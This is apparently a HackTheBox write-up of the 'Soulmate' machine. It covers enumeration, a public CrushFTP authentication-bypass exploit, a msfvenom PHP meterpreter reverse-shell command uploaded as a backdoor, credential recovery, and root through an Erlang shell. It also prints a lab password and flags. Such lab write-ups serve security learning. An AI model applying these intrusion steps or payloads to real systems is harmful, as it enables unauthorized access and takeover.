# Soulmate - HackTheBox
<img src="soulmate.jpeg" alt="Heart Emoji" width="500"/>

## Challenge Overview
![Nmap Scan](picture1.png)

## Enumeration

We start with an nmap scan:

```bash
sudo nmap -sCV 10.10.11.86 -T5 -onmap_result 
```

![Nmap Scan](picture2.png)

- Open ports discovered:
  - `22/tcp`   → SSH (OpenSSH 8.9p1 Ubuntu)
  - `80/tcp`   → HTTP (nginx 1.18.0, Ubuntu)


### Host File Configuration

We need to put the ` <IP TARGET> <DOMAIN TARGET> ` into `/etc/hosts` to allow me to access the website.

![Cookies](picture3.png)

---

## HTTP Enumeration

We browse the web service on port 80, which loads a site titled **Soulmate - Find Your Perfect Match**.

![Webpage](picture4.png)

Let's get started by register as a new user.

![Redirect](picture5.png)

Login in the page we first greeted with a **My Profile** page.

![Erlang Process](picture6.png)

![SSH Tunnel](picture7.png)

Further exploring the website gave us nothing, therefore let's use gobuster to find hidden subdomains to the web server:

```bash
sudo gobuster vhost -u http://soulmate.htb/ -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt --append-domain -t 50
```

![Erlang Shell](picture8.png)

Discovered subdomain:
```
ftp.soulmate.htb
```
After adding it into the /etc/hosts file, we can now access the subdomain.

![Processes](picture9.png)

## CrushFTP

Before anything else, run a nmap scan to fingerprint the web server and discover what the site is running on.

Interesting! it run on **CrushFTP!**

![Reverse Shell](picture10.png)

Now to exploit the service, I explore the internet and downloaded a bunch of exploit connected to CrushFTP. But all is false hope....

![Stabilized Shell](picture11.png)

Then suddenly i found this article on a Well-known and new CVE regarding CrushFTP.

![User Flag](picture12.1.png)

Searching the github version of the CVE found me with a repo containing the exploit https://github.com/Immersive-Labs-Sec/CVE-2025-31161/tree/main.

![User Flag](picture12.png)

![User Flag](picture12.2.png)

Running the script, able me to create a new user account with Admin level permissions.

![Config](picture13.png)

Logged into the CrushFTP, I started exploring the website to find anything i can use to gain initial access.

![Config](picture14.png)

Hurmm..

![Config](picture15.png)

Hurmm.. Some interesting graph and chart.

![Config](picture16.png)

Ohh what do we have here... A User Management Interface!

![Config](picture17.png)

Going through all the users, I can see that only **ben** have the file directory that we can see

`ben`
`IT`
`webProd` <-- contain the files generated for the first website! 

![Config](picture18.png)

As 'acting admin' we can temporaly change the password for **Ben**.

![Config](picture20.png)

Let's save this first and logged out from this account.
![Config](picture21.png)

Login as **Ben**, we can access the files and folders we saw before.

![Config](picture22.png)

![Config](picture23.png)

Now to begin our exploitation phase. Hehe....

## Gaining User Access
We saw that the files generated for the first website is in a php format, therefore lets use msfvenom to create our payload.

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<HOST_IP> LPORT=<HOST_PORT> -f raw -o backdoor.php
```

![Config](picture24.png)

Now, we upload the file into the directory

![Config](picture25.png)

![Config](picture26.png)

![Config](picture27.png)

![Config](picture28.png)

We set up a Netcat listener and triggered the exploit, receiving a meterpreter session.

![Config](picture30.png)

From the meterpreter, we opened a normal bash shell for easier interaction.

![Config](picture31.png)

We uploaded and executed linpeas.sh, which highlighted potential escalation vectors.

![Config](picture32.png)

Looking at the files shown in linpeas.sh result, we found an Erlang script that exposed ben credentials!!!

`ben : HouseH0ldings998`

![Config](picture33.png)

Using the discovered password, we switched from www-data to ben.

![Config](picture34.png)

As ben, we navigated to the home directory and obtained the `user.txt`.

![Config](picture35.png)

**User Flag:** `2afb74eb0207a6e1e06337ba59e3a`

---

## Privilege Escalation

After obtaining ben’s credentials, we log in via SSH to gain a stable session.

![Enumeration](picture36.png)

We notice a custom Erlang-based SSH service running on port 2222. Connecting to it with ben’s password drops us into an Eshell environment.

![Config](picture37.png)

This is my first time using Eshell 😅
I asked chatgpt to gave me the running Eshell command.

Based on the result, I know that Eshell command use os:cmd("command") function. 

![Exploitation](picture38.png)

Let's gooo we got the `Root.flag`!!!!!

![alt text](<Screenshot 2025-09-08 192551.png>)

### Reverse Shell

We can also gain a fully interactive root shell by spawning a reverse shell back to our attacker machine.

![Switch User](picture39.png)

**BOOM!** we got Root User!

![Ben User](picture40.png)

**Root Flag:** `48c77b04477c61a75e83dc3cf7560f80`

---

### Machine Pwned

![Sudo](picture41.png)

**This is my Soulmate HTB write-up, thank you for reading!**
